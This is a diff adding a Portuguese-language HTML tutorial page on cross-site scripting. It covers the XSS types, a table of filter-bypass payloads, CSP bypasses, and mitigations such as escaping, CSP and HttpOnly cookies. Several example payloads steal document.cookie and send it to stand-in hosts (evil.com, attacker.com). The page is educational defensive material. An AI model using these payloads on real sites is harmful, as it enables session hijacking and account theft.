@@ -1,0 +1,250 @@
+﻿<!DOCTYPE html>
+<html lang="pt-br">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+  <meta name="color-scheme" content="dark light" />
+  <meta name="description" content="Cross-Site Scripting (XSS): tipos Reflected, Stored e DOM, payloads, bypass de filtros, CSP e mitigações eficazes." />
+  <link rel="preload" href="/css/base.css" as="style" fetchpriority="high" />
+  <link rel="stylesheet" href="/css/base.css" />
+  <link rel="icon" href="/imagens/favicon/favicon.png" type="image/png">
+  <link rel="apple-touch-icon" href="/imagens/favicon/favicon.png">
+  <link rel="preload" href="/js/main.js" as="script">
+  <script src="/js/main.js" defer></script>
+  <title>XSS — Cross-Site Scripting | Site Guia</title>
+</head>
+
+<body>
+  <div class="nav-overlay"></div>
+  <div class="nav-interno-overlay"></div>
+  <button class="menu-toggle" title="Abrir/fechar navegação">
+    <span class="menu-icon">☰</span><span class="close-icon">&ltimes;</span>
+  </button>
+  <button class="menu-interno-toggle" title="Abrir/fechar menu interno">
+    <span class="menu-icon">☰</span><span class="close-icon">&rtimes;</span>
+  </button>
+  <div data-include="/html/Site/partials/header.html"></div>
+
+  <main class="main-content">
+    <div class="content-area">
+
+      <div class="Colored_border_anim_card_box">
+        <p><strong>XSS — Cross-Site Scripting</strong></p>
+      </div>
+
+      <section>
+        <h2 id="intro" class="section-title">O que é XSS?</h2>
+
+        <div class="page-header">
+          <div class="logo logo--lg page-icon" role="img" aria-label="Dragão do Site Guia"></div>
+          <h1>XSS — Cross-Site Scripting</h1>
+          <p>Injeção de JavaScript malicioso em páginas web — roubo de sessões, keylogging e redirecionamento.</p>
+        </div>
+
+        <p class="intro-highlight">Cross-Site Scripting é a injeção de código JavaScript malicioso em páginas web que outros usuários visualizam. Permite roubo de cookies/sessões, keylogging, redirecionamento, defacement e ataques de phishing internos. É a vulnerabilidade mais prevalente em aplicações web há décadas.</p>
+        <div class="section-divider"></div>
+      </section>
+
+      <section>
+        <h2 id="tipos" class="section-title">Tipos de XSS</h2>
+        <div class="section-divider"></div>
+
+        <div class="logic-grid">
+          <div class="card card--danger">
+            <h3 class="text--danger">Reflected XSS</h3>
+            <p>O payload é incluído na requisição e refletido imediatamente na resposta. Não é persistido. Requer engenharia social para fazer a vítima clicar em link malicioso.</p>
+            <pre class="code-block" style="font-size:0.8rem">
+# URL maliciosa (exemplo):
+https://site.com/search?q=&lt;script&gt;document.location='https://evil.com/steal?c='+document.cookie&lt;/script&gt;
+
+# Resposta da aplicação vulnerável:
+Resultados para: &lt;script&gt;...&lt;/script&gt;</pre>
+          </div>
+          <div class="card card--danger">
+            <h3 class="text--danger">Stored XSS (Persistent)</h3>
+            <p>O payload é armazenado no banco de dados e renderizado a cada visita de qualquer usuário. Mais perigoso — não requer interação específica além de visitar a página.</p>
+            <pre class="code-block" style="font-size:0.8rem">
+# Comentário de blog enviado pelo atacante:
+&lt;img src=x onerror="fetch('https://evil.com/?c='+btoa(document.cookie))"&gt;
+
+# Todo usuário que ver o comentário executa o código</pre>
+          </div>
+          <div class="card card--danger">
+            <h3 class="text--danger">DOM-Based XSS</h3>
+            <p>O JavaScript da própria página lê dados de fontes inseguras (URL hash, localStorage) e os escreve no DOM sem sanitização. O payload nunca passa pelo servidor.</p>
+            <pre class="code-block" style="font-size:0.8rem">
+// Código vulnerável:
+document.getElementById('output').innerHTML =
+  location.hash.slice(1); // lê #payload da URL
+
+// URL de ataque:
+https://site.com/page#&lt;img src=x onerror=alert(1)&gt;</pre>
+          </div>
+          <div class="card">
+            <h3>Self-XSS</h3>
+            <p>Engana o usuário para executar código no próprio console. Não é diretamente explorável por atacante, mas usado em campanhas de social engineering ("console challenge").</p>
+          </div>
+        </div>
+      </section>
+
+      <section>
+        <h2 id="payloads" class="section-title">Payloads e Bypass de Filtros</h2>
+        <div class="section-divider"></div>
+
+        <div class="scroll-x">
+          <table>
+            <thead>
+              <tr><th>Técnica</th><th>Payload</th><th>Contorna</th></tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td>Básico</td>
+                <td><span class="code-inline">&lt;script&gt;alert(1)&lt;/script&gt;</span></td>
+                <td>Filtros ausentes</td>
+              </tr>
+              <tr>
+                <td>Event handler</td>
+                <td><span class="code-inline">&lt;img src=x onerror=alert(1)&gt;</span></td>
+                <td>Filtro de <span class="code-inline">&lt;script&gt;</span> somente</td>
+              </tr>
+              <tr>
+                <td>Case variation</td>
+                <td><span class="code-inline">&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;</span></td>
+                <td>Blacklist case-sensitive</td>
+              </tr>
+              <tr>
+                <td>HTML encoding</td>
+                <td><span class="code-inline">&lt;img src=x onerror=&#x61;lert(1)&gt;</span></td>
+                <td>Filtros de string literal</td>
+              </tr>
+              <tr>
+                <td>JS template literal</td>
+                <td><span class="code-inline">&lt;svg/onload=`${alert(1)}`&gt;</span></td>
+                <td>WAFs que bloqueiam parênteses</td>
+              </tr>
+              <tr>
+                <td>Attribute injection</td>
+                <td><span class="code-inline">" onfocus="alert(1)" autofocus="</span></td>
+                <td>Contexto dentro de atributo</td>
+              </tr>
+              <tr>
+                <td>Protocol injection</td>
+                <td><span class="code-inline">javascript:alert(1)</span> em href/src</td>
+                <td>Contexto de URL/link</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </section>
+
+      <section>
+        <h2 id="rouboCookies" class="section-title">Roubo de Sessão e Cookie Stealing</h2>
+        <div class="section-divider"></div>
+
+        <div class="message-block">
+          <p>O objetivo final do XSS geralmente é roubar o <span class="code-inline">document.cookie</span> da vítima para sequestro de sessão. Isso é evitado pela flag <strong>HttpOnly</strong>.</p>
+        </div>
+
+        <pre class="code-block">
+// Payload de cookie stealing (sem HttpOnly):
+&lt;script&gt;
+  new Image().src = "https://attacker.com/log?c=" + encodeURIComponent(document.cookie);
+&lt;/script&gt;
+
+// Com HttpOnly ativado: document.cookie = "" — cookies inacessíveis ao JS
+// Nesse caso atacante pode usar XSS para:
+// - Adicionar admin ao perfil via requisição autenticada (CSRF via XSS)
+// - Capturar formulários com keylogger
+// - Mudar senha/email da conta</pre>
+
+        <div class="scroll-x">
+          <table>
+            <thead>
+              <tr><th>Flag do Cookie</th><th>Proteção</th></tr>
+            </thead>
+            <tbody>
+              <tr><td><span class="code-inline">HttpOnly</span></td><td>Bloqueia acesso via <span class="code-inline">document.cookie</span> — essencial para sessões</td></tr>
+              <tr><td><span class="code-inline">Secure</span></td><td>Cookie só enviado via HTTPS — protege interceptação</td></tr>
+              <tr><td><span class="code-inline">SameSite=Strict</span></td><td>Bloqueia envio em requisições cross-site — mitiga CSRF</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </section>
+
+      <section>
+        <h2 id="csp" class="section-title">Content Security Policy (CSP)</h2>
+        <div class="section-divider"></div>
+
+        <p>CSP é o mecanismo mais eficaz para mitigar XSS — restringe quais scripts o browser executa.</p>
+
+        <pre class="code-block">
+# Header de resposta HTTP:
+Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.exemplo.com; object-src 'none'
+
+# Explicação das diretivas:
+# default-src 'self'        → por padrão, só carregar recursos do mesmo domínio
+# script-src 'self' cdn...  → scripts permitidos: próprio domínio + CDN específico
+# object-src 'none'         → bloqueia &lt;object&gt;, &lt;embed&gt; (Flash, plugins)
+
+# EVITE:
+Content-Security-Policy: script-src 'unsafe-inline' 'unsafe-eval'
+# 'unsafe-inline' anula proteção contra XSS inline
+# 'unsafe-eval' permite eval(), Function(), setTimeout(string)</pre>
+
+        <div class="grid-cards">
+          <div class="card card--danger">
+            <h3 class="text--danger">Bypasses de CSP comuns</h3>
+            <ul>
+              <li><strong>JSONP endpoint no whitelist</strong>: <span class="code-inline">?callback=alert(1)</span></li>
+              <li><strong>Angular/Vue em CDN whitelistado</strong>: template injection via diretivas</li>
+              <li><strong>Redirecionamentos open</strong>: carrega script externo via redirect confiável</li>
+              <li><strong>script-src 'strict-dynamic'</strong> mal configurado</li>
+            </ul>
+          </div>
+          <div class="card card--success">
+            <h3>CSP Report-Only</h3>
+            <p>Use <span class="code-inline">Content-Security-Policy-Report-Only</span> para testar sem bloquear, com <span class="code-inline">report-uri</span> para coletar violações antes de ativar em modo enforce.</p>
+          </div>
+        </div>
+      </section>
+
+      <section>
+        <h2 id="mitigacoes" class="section-title">Mitigações Eficazes</h2>
+        <div class="section-divider"></div>
+
+        <div class="grid-cards">
+          <div class="panel">
+            <p class="panel-title">1. Sanitização de Output</p>
+            <p>Todo valor que vem do usuário e é inserido no HTML deve ser escapado. Use bibliotecas como DOMPurify (JS), OWASP Java HTML Sanitizer, AntiXSS (C#).</p>
+          </div>
+          <div class="panel">
+            <p class="panel-title">2. Evitar innerHTML / eval</p>
+            <p>Prefira <span class="code-inline">textContent</span> sobre <span class="code-inline">innerHTML</span>. Nunca use <span class="code-inline">eval()</span>, <span class="code-inline">setTimeout(string)</span> ou <span class="code-inline">document.write()</span> com dados externos.</p>
+          </div>
+          <div class="panel">
+            <p class="panel-title">3. Content Security Policy</p>
+            <p>Implemente CSP restritivo, evitando <span class="code-inline">unsafe-inline</span>. Use nonces ou hashes para scripts legítimos.</p>
+          </div>
+          <div class="panel">
+            <p class="panel-title">4. HttpOnly + Secure nos cookies</p>
+            <p>Todo cookie de sessão deve ter <span class="code-inline">HttpOnly</span>, <span class="code-inline">Secure</span> e <span class="code-inline">SameSite</span>. Limita enormemente o impacto de um XSS bem-sucedido.</p>
+          </div>
+        </div>
+      </section>
+
+      <div class="callout">
+        <p>XSS continua sendo a vulnerabilidade mais encontrada em bug bounty. Mesmo com frameworks modernos que fazem escaping por padrão (React, Angular, Vue), é possível introduzir XSS via <span class="code-inline">dangerouslySetInnerHTML</span>, <span class="code-inline">innerHTML</span>, <span class="code-inline">v-html</span> ou <span class="code-inline">bypassSecurityTrustHtml</span>. Revise sempre os pontos onde o app serializa dados para o DOM.</p>
+        <p class="frase-destaque">
+          <span data-svg="estrela" aria-hidden="true"></span>
+          "Nunca confie em input do usuário — e nunca coloque input do usuário no DOM sem sanitização."
+        </p>
+      </div>
+
+    </div>
+  </main>
+
+  <div data-include="/html/Site/partials/footer.html"></div>
+</body>
+
+</html>
